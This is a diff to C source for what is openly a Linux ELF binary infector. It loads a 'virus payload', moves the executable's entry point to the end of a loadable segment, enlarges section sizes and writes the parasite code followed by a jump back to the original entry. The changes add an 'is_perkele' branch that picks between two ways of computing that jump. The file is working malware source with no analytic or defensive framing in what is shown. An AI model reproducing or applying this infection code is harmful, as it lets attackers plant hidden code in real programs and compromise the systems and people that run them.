@@ -42,21 +42,27 @@ int main(int argc, char** argv){
         printf("Invalid arguments");
         return -1;
     }
-    printf("%s, %s, %s\n", in_file, payload, out_file);
-    char * host;
+
     int virus_fd;
     uint8_t* memory;
     size_t virus_size, virus_file_size;
     Elf64_Addr text_off_t, jmp_off_t;
     get_virus_payload(payload, &virus_fd, &memory, &virus_size, &text_off_t, &virus_file_size);
     uint8_t *text_section = memory + text_off_t;
-    get_jump_offset(memory, virus_size, text_off_t, &jmp_off_t);
+    if(is_perkele){
+        get_jump_offset(memory, virus_size, text_off_t, &jmp_off_t);
+    }
     unsigned char * parasite =  (unsigned  char*)"\xE9\xF2\xFC\xFF\xF1";
     size_t  jump_length = 5;
     size_t length_without_jump = virus_size;
     struct stat sb;
     size_t psize = getpagesize();
-    int jmp_len = length_without_jump;
+    int jmp_len;
+    if(is_perkele){
+        jmp_len = length_without_jump;
+    } else{
+        jmp_len = length_without_jump + jump_length;
+    }
 
 
 
@@ -81,7 +87,7 @@ int main(int argc, char** argv){
     older_entry = ehdr->e_entry;
     printf("%x\n", ehdr->e_entry);
     ehdr->e_shoff += psize;
-//
+
     for(int  i = 0; i < ehdr->e_phnum; i++){
         if(phdr[i].p_type == PT_LOAD){
             ehdr->e_entry = phdr[i].p_vaddr + phdr[i].p_filesz;
@@ -98,7 +104,7 @@ int main(int argc, char** argv){
             break;
         }
     }
-//
+
     for(int i = 0; i < ehdr->e_shnum; i++){
         if(shdr[i].sh_addr > start_of_text && shdr[i].sh_addr < end_of_text && shdr[i + 1].sh_addr > end_of_text){
             shdr[i].sh_size += jmp_len;
@@ -115,14 +121,25 @@ int main(int argc, char** argv){
         printf("%d", errno);
         return -1;
     }
-    Elf64_Addr jmp = older_entry - (ehdr->e_entry + jmp_off_t);
+    Elf64_Addr jmp;
     static unsigned char address[4];
-    *(int*)&address[0] = jmp;
+    if(is_perkele){
+       jmp = older_entry - (ehdr->e_entry + jmp_off_t);
+        *(int*)&address[0] = jmp;
 
-
-    if(write(out_fd, text_section, jmp_off_t - 5) < 0){
-        return -1;
+        if(write(out_fd, text_section, jmp_off_t - 5) < 0){
+            return -1;
+        }
+    } else{
+        jmp = older_entry - (ehdr->e_entry + virus_size + 5);
+        *(int*)&address[0] = jmp;
+        if(write(out_fd, text_section, virus_size) < 0){
+            return -1;
+        }
     }
+
+
+
 
     if(write(out_fd, parasite, 1) < 0){
         return -1;
@@ -130,9 +147,12 @@ int main(int argc, char** argv){
     if(write(out_fd, address, 4) < 0){
         return -1;
     }
-    if(write(out_fd, text_section + jmp_off_t, virus_size - jmp_off_t) < 0){
-        return -1;
+    if(is_perkele){
+        if(write(out_fd, text_section + jmp_off_t, virus_size - jmp_off_t) < 0){
+            return -1;
+        }
     }
+
 
 
     if(lseek(out_fd, psize - jmp_len, SEEK_CUR) < 0){
